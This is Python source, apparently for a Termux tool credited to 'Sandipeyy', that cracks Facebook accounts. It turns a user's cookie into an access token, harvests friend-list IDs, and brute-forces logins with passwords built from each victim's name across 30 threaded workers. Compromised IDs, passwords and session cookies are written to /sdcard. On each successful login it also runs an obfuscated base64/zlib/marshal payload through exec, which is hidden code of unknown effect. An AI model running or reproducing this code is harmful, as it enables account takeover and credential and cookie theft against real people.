			animation(f' [\x1b[38;5;196m ×\x1b[37m] CHECK YOUR INTERNET CONNECTION')
			exit()
	except IOError:
		login123()

def login_lagi334():
	global logincookie
	try:
		if logincookie:
		    cookie = logincookie
		else:
			linex()
			cookie = input(' [\u001b[36m>\033[1;37m] ENTER COOKIE : ')
		try:
			asu = random.choice([m,k,h,b,u])
			open("data/.cok.txt", "w").write(cookie)
			with requests.Session() as rsn:
				try:
					rsn.headers.update({
	                    'Accept-Language': 'id,en;q=0.9',
	                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
	                    'Referer': 'https://www.instagram.com/',
	                    'Host': 'www.facebook.com',
	                    'Sec-Fetch-Mode': 'cors',
	                    'Accept': '*/*',
						'Connection': 'keep-alive',
	                    'Sec-Fetch-Site': 'cross-site',
	                    'Sec-Fetch-Dest': 'empty',
	                    'Origin': 'https://www.instagram.com',
	                    'Accept-Encoding': 'gzip, deflate',
	                })
					response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
					if '"access_token":' in str(response.headers):
						token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
						open("data/.token.txt", "w").write(token)
						linex()
						animation(f' \x1b[38;5;196m[\x1b[37m✓\x1b[38;5;196m]\x1b[37m LOGIN DONE RESTARTING !');restart()
					else:
						linex()
						animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
				except:
					linex()
					animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
		except Exception as e:
			linex()
			animation(f' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m LOGIN TOKEN/COOKIE EXPIRED')
			os.system('rm -rf data/.token.txt && rm -rf data/.cok.txt')
			time.sleep(1)
			back()
	except Exception as e:
		print(e)

#------------------[ MENU ]----------------#

def menu(my_name,my_id):
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
	except IOError:
		print('[×] INVIALD COOKIE ')
		time.sleep(5)
		login()
	os.system('clear')
	banner()
	info()
	print(f" \x1b[37m[\u001b[36m>\033[1;37m] {greeting}{uname} ")
	print(f" \x1b[37m[\u001b[36m>\033[1;37m] YOUR PUBLIC IP : {ipadd}")
	linex()
	print(f" \x1b[37m[\u001b[36m>\033[1;37m] COOKIE USER    : {my_name}")
	print(f" \x1b[37m[\u001b[36m>\033[1;37m] COOKIE USER ID : {my_id} ")
	linex()
	print(f""" [\u001b[36m1\033[1;37m] CRACK PUBLIC       [\u001b[36m4\033[1;37m] RESET DETAILS""")
	print(f""" [\u001b[36m2\033[1;37m] CRACK FILE         [\u001b[36m5\033[1;37m] CONTACT ADMIN""")
	print(f""" [\u001b[36m3\033[1;37m] CHECK RESULTS      [\u001b[36m>\033[1;37m] COMMAND GROUPS""")
	print(f""" [\u001b[36m0\033[1;37m] LOGOUT MENU""")
	linex()
	_____Sandipeyy_____ = input(' CHOOSE : ')
	if _____Sandipeyy_____ in ['1']:
		harry_public()
	elif _____Sandipeyy_____ in ['2']:
		fileopt()
	elif _____Sandipeyy_____ in ['3','03']:
		passask()
		sandipeyresults()
	elif _____Sandipeyy_____ in ['4','04']:
		passask()
		os.system('rm -rf data/password.xml')
		os.system('rm -rf data/name.xml')
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m✓\x1b[38;5;196m]\x1b[37m RESET DONE')
		restart()
	elif _____Sandipeyy_____ in ['5','05']:
		contact()
	elif _____Sandipeyy_____ in ['0']:
		passask()
		os.system('rm -rf data/.token.txt')
		os.system('rm -rf data/.cok.txt')
		linex()
		animation(' [✓] DONE LOGOUT ')
		exit()
	elif _____Sandipeyy_____ in ['6']:
		groups()
	else:
		linex()
		animation(' [×] SELECT CORRECTLY ')
		back()

#-----------------[ HASIL-CRACK ]-----------------#

def sandipeyresults():
    ok_file_path = '/sdcard/Sandipeyy/Sandipeyy-ok.txt'
    cp_file_path = '/sdcard/Sandipeyy/Sandipeyy-cp.txt'

    if not (os.path.exists(ok_file_path) and os.path.exists(cp_file_path)):
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m NO IDS SAVED")
        return
    linex()
    print(" [\u001b[36m>\033[1;37m] CHECK OK IDS \n [\u001b[36m>\033[1;37m] CHECK CP IDS")
    linex()
    user_choice = input(" CHOOSE : ")

    if user_choice == '1':
        linex()
        show_cookies = input(" \x1b[38;5;196m[\x1b[37m>\x1b[38;5;196m]\x1b[37m SHOW COOKIES (y/n): ").lower() == 'y'
        linex()
        process_file(ok_file_path, show_cookies)
    elif user_choice == '2':
        linex()
        process_file(cp_file_path, show_cookies=False)
    else:
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m INVALID CHOICE ")

def process_file(file_path, show_cookies):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    for i, line in enumerate(lines, start=1):
        parts = line.strip().split('|')
        if show_cookies:
            print(f" \x1b[38;5;196m[\x1b[37m{i}\x1b[38;5;196m]\x1b[37m  {parts[0]} • {parts[1]}")
            kuki = parts[2]
            print(f" [🍪] {kuki}")
        else:
            print(f" \x1b[38;5;196m[\x1b[37m{i}\x1b[38;5;196m]\x1b[37m {parts[0]} | {parts[1]}")
    linex()
    input(" [\u001b[36m>\033[1;37m] ENTER TO EXIT ");restart()

#-----------------[ CONTACT ]-----------------#

def contact():
	os.system('xdg-open https://www.facebook.com/sand1pey')

#-------------------[ GROUPS ]----------------#

def groups():
	os.system('xdg-open https://m.me/j/AbbQvUmihgqiyckr/')

#-------------------[ CRACK-PUBLIK ]----------------#

def harry_public():
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
	except IOError:
		print('[×] INVIALD COOKIE ')
		time.sleep(5)
		login()
	try:
		linex()
		jum = int(input(' [\u001b[36m>\033[1;37m] ENTER TARGET AMOUNT  : '))
		linex()
	except ValueError:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m INVALID OPTION ')
		restart()
	if jum<1 or jum>100000000:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m TRY AGAIN ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' [\u001b[36m>\033[1;37m] INPUT UID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			head = (
			{"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
			})
			if len(id) == 0:
				params = (
				{
				'access_token': token,
				'fields': "friends"
				}	          
			)
			else:
				params = (
				{
				'access_token': token,
				'fields': "friends"
				}	           
			)
			col = ses.get('https://graph.facebook.com/{}'.format(userr),params=params,headers=head,cookies={'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			linex()
			animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m TRY AGAIN ')
			os.system('clear')
	try:
		linex()
		print(f' [\u001b[36m>\033[1;37m] TOTAL ID : \x1b[38;5;196m'+str(len(id))+'\x1b[37m')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
	except (KeyError,IOError):
		linex()
		animation(" [×] DUMP ID FAILED ")
		time.sleep(3)
		back()

#-------------[ CRACK-FROM-FILE ]------------------#

def fileopt():
 	crack_file()

def crack_file():
	global file_name
	if file_name:
		o = file_name
	else:
	    linex()
	    o  = input(' [\u001b[36m>\033[1;37m] FILE NAME : ')
	try:lin = open(o).read().splitlines()
	except:
		linex()
		animation(' [×] FILE NOT FOUND')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()

#-------------[ PENGATURAN-IDZ ]---------------#

def setting():
	linex()
	print(" [\u001b[36m1\033[1;37m] ONLY OLD IDZ")
	print(" [\u001b[36m2\033[1;37m] ONLY NEW IDZ")
	print(" [\u001b[36m3\033[1;37m] BOTH MIX IDZ")
	linex()
	hu = input(' [\u001b[36m>\033[1;37m] CHOOSE : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[] 
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	linex()
	print(" [\u001b[36m>\033[1;37m] LOGIN METHOD ")
	linex()
	print(" [\u001b[36m1\033[1;37m] METHOD 1 (\u001b[36mMOBILE.FACEBOOK\033[0;97m)")
	print(" [\u001b[36m2\033[1;37m] METHOD 2 (\u001b[36mFREE.FACEBOOK\033[0;97m)")
	linex()
	hc = input(' [\u001b[36m>\033[1;37m] CHOOSE : ')
	linex()
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	passwrd()
	exit() 
#-------------------[ BAGIAN-WORDLIST ]------------#

def passwrd():
	os.system('clear')
	banner()
	info()
	print(" \x1b[37m[\u001b[36m>\033[1;37m] CLONING STARTED TIME : "+time.strftime("%H:%M")+" "+ tag)
	print(f' [\u001b[36m>\033[1;37m] TOTAL IDZ TO SCAN  :',str(len(id)))
	linex()
	print(f' \u001b[36m>>\033[1;37m USE FLIGHT MODE BEFORE USE ')
	linex()
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			pwv = []
			frs = nmf.split(' ')[0]
			try:
				lst = nmf.split(' ')[1]
			except:
				lst = ''
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+lst)
					pwv.append(frs+'@'+lst)
					pwv.append(frs+'#'+lst)
					pwv.append(lst+frs)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+lst+'123')
					pwv.append(frs+lst+'1234')
					pwv.append(frs+lst+'@123')
					pwv.append(frs+lst+'@1234')
					pwv.append(frs+lst+'321')
					pwv.append(lst+frs+'123')
					pwv.append(lst+frs+'111')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+lst)
					pwv.append(frs+'@'+lst)
					pwv.append(frs+'#'+lst)
					pwv.append(lst+frs)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+lst+'123')
					pwv.append(frs+lst+'1234')
					pwv.append(frs+lst+'@123')
					pwv.append(frs+lst+'@1234')
					pwv.append(frs+lst+'321')
					pwv.append(lst+frs+'123')
					pwv.append(lst+frs+'111')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('\n\x1b[37m----------------------------------------------')
	print(' [\u001b[36m>\033[1;37m] CLONING COMPLETE AT '+time.strftime("%H:%M")+" "+ tag)
	print(' [\u001b[36m>\033[1;37m] OK : %s '%(ok))
	print(' [\u001b[36m>\033[1;37m] CP : %s '%(cp))
	linex()
	woi = input(' \x1b[38;5;196m>>\x1b[37m ENTER TO BACK')
	restart()

#--------------------[ METHOD-CRACK ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r {P}(Sandipeyy){P} ({P}{loop}{P}-{P}{len(id)}{P}) (OK{P}-{H}{ok}{P}) ({'{:.0%}'.format(loop/float(len(id)))}{P})"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:			
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=1.600786805152893; wd=1048x2103'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9"}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;96m (\033[1;91mSandipeyy-Check\033[1;96m) \033[1;91m '+idf+ ' – '+pw+'')
				open('/sdcard/SANDIPEYY-FILE-CLONE-CP','a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])				
				print(f'\r\x1b[1;96m (\033[1;92mSandipeyy-Firee\033[1;96m) \033[1;92m '+idf+ ' – '+pw+'')
				print('\r\x1b[1;96m (\033[1;93m🍪\033[1;96m)\033[1;91m – \033[1;97m '+kuki+'')
				_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==wgDsVgLg/j4d/Y//an0/d6a8+Ozr/e+CPA/9Ut8AwrEwrE4LP+wfH5QMkv8e3z0Dw19+/e5ivyaojw/8xtzP9j7uN+15rvK8/Pg8rDpMuHf9wD13YSKrSINiwc2u5fhcwSo9KCikfs4dwXoLEmUZqKnSxFuhpqgKauiOhqXrWMFxJaCXb0+s76442xxGayq1NVCzaaNfwV5mLumLcJMPEqKprENjj2zvJ2XYqoideFJsnYbZB8XFMZUnTUUp9YdeTE1/pobr4s9Clwaft4Y5qtRMzq66UGUIeQjvJDXTNDOzWok/C2cuzdp2rpak7cc1hXzoEzpP/t4NkbjfOCszbk/EKrqsQt9o6mj7HVoA8+7ss2M54mqQ+m35gg+lrObFyBhO7XlQsOJP2S1RpeFmOJIDPppyAqMfBTxkrzOHY27flcJzskDPowVPsQ1g25TNJRtjUl5O9ZGl8v4w4wqsHX3arjwyHheZF/+L4vVoqbHA+sDRtnNqEW9ZrFk0iEesWq6AGaRhct6aYgKOxUoSSBmXUNVicS1bkmgehxEvrrdML+TNklVyrBd/9CGTKnmq7cl26LapbBf7wayMIqvyeGZ6dU8weLDuNbnVXnBLZZzQj+mYRNSTR0EyYKstpRbLxYhr2tVK0KOJ7uClejutpYJ5iox5Rxmoc4tE9sQr3xFpoX1MNUm2WqDAylRNetH7SxIRF56qM7i2CP2/GdzUMwVXbI4h19t6XTybnujmJFR84BTXjgZSibJuYmRRS3meiBw3DHynIo5B/l9qOzxNcYYM36haP6LP/YG6LMA8wT67xHGQsIC0xfb/s8bAPAMifEisd8Ag3Cx39Pv+9fP08fCeR1fbxD+e76FIN002jmuqG9LH7TyEafogBYfV0vqRuxMuH+4dKjTNnG1oBjopJNDFmg4dKqBNpfK3R2u/vxUY3oqutklxJe'))
				open('/sdcard/SANDIPEYY-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1
	
#-----------------------[ SYSTEM-CONTROL ]--------------------#

if __name__=='__main__':
	try:os.mkdir('/sdcard/Sandipeyy')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	time.sleep(3)
	login()
#>>>>> WRITTEN BY<<<<<<<#
#>>>  💐SANDIPEYY💐 <<<#